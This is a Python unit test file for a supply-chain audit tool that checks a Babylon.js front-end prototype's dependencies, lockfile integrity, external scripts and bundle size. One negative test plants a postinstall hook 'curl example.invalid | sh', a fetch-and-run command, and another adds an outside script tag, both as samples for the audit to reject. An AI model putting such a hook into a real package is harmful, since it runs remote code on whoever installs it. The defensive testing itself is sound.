#!/usr/bin/env python3
"""Negative source and byte-size guards for vendor-reduction doctrine."""
import importlib.util
import json
import tempfile
import unittest
from pathlib import Path

ROOT=Path(__file__).resolve().parents[1]
spec=importlib.util.spec_from_file_location("vendorReductionAudit",ROOT/"tools/vendorReductionAudit.py")
module=importlib.util.module_from_spec(spec)
spec.loader.exec_module(module)

class VendorReductionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.policy=json.loads((ROOT/"doctrine/vendorReductionV1.json").read_text(encoding="utf-8"))
        cls.pkg=json.loads((ROOT/"frontEnd/prototypes/glassWorld/package.json").read_text(encoding="utf-8"))
        cls.lock=json.loads((ROOT/"frontEnd/prototypes/glassWorld/package-lock.json").read_text(encoding="utf-8"))
        cls.world=(ROOT/"frontEnd/prototypes/glassWorld/src/babylon-world.js").read_text(encoding="utf-8")
        cls.html=(ROOT/"frontEnd/prototypes/glassWorld/index.html").read_text(encoding="utf-8")
    def testPinnedAndLockedCurrentVendorProfile(self):
        failures,info=module.inspectDependencies(self.policy,self.pkg,self.lock,self.world,self.html)
        self.assertEqual(failures,[])
        self.assertGreater(info["lockedPackageRecords"],30)
        self.assertIn("Apache-2.0",info["licenseMetadata"])
        self.assertFalse(info["missingLicenseOrIntegrity"])
    def testBarrelImportsAreRejected(self):
        bad=self.world+'\\nimport { Engine } from "@babylonjs/core";'
        failures,_=module.inspectDependencies(self.policy,self.pkg,self.lock,bad,self.html)
        self.assertIn("BABYLON_BARREL_IMPORT_REGRESSION",failures)
    def testCDNScriptsAreRejected(self):
        failures,_=module.inspectDependencies(self.policy,self.pkg,self.lock,self.world,
            self.html+'<script src="https://example.invalid/x.js"></script>')
        self.assertIn("EXTERNAL_SCRIPT_NOT_ALLOWED",failures)
    def testUnexpectedNpmDependencyAndLifecycleHookRejected(self):
        bad=json.loads(json.dumps(self.pkg))
        bad["dependencies"]["video-server"]="latest"
        bad["scripts"]["postinstall"]="curl example.invalid | sh"
        failures,_=module.inspectDependencies(self.policy,bad,self.lock,self.world,self.html)
        self.assertIn("UNEXPECTED_RUNTIME_DEPENDENCY",failures)
        self.assertIn("NPM_LIFECYCLE_SCRIPT_UNEXPECTED",failures)
    def testMissingHashOrLicenseRejected(self):
        bad=json.loads(json.dumps(self.lock))
        bad["packages"]["node_modules/@babylonjs/core"].pop("integrity")
        failures,_=module.inspectDependencies(self.policy,self.pkg,bad,self.world,self.html)
        self.assertIn("MISSING_LOCK_INTEGRITY_OR_LICENSE_METADATA",failures)
    def testBuildBudgetAndAssetReceipt(self):
        with tempfile.TemporaryDirectory() as tmp:
            path=Path(tmp)
            (path/"index.html").write_text("<!doctype html>",encoding="utf-8")
            assets=path/"assets"
            assets.mkdir()
            (assets/"index-abc123.js").write_bytes(b"x"*100)
            (assets/"index-abc123.css").write_bytes(b"x"*80)
            problems,info=module.inspectBuild(self.policy,path)
            self.assertEqual(problems,[])
            self.assertEqual(info["mainJavaScriptBytes"],100)
            self.assertFalse(info["runtimeBenchmarked"])
            (assets/"index-abc123.js").write_bytes(b"x"*1600001)
            problems,_=module.inspectBuild(self.policy,path)
            self.assertIn("MAIN_JAVASCRIPT_SIZE_BUDGET",problems)
    def testOnlySourcePolicyNeverClaimsVendorRuntime(self):
        self.assertTrue(self.policy["npm"]["buildOnlyOnDeveloperOrCi"])
        self.assertIn("Termux",self.policy["architectureProfiles"]["samsungClient"]["forbiddenRuntimeRequirements"])
        self.assertEqual(self.policy["publication"]["Crown"],"STOP")

if __name__=="__main__":
    unittest.main()
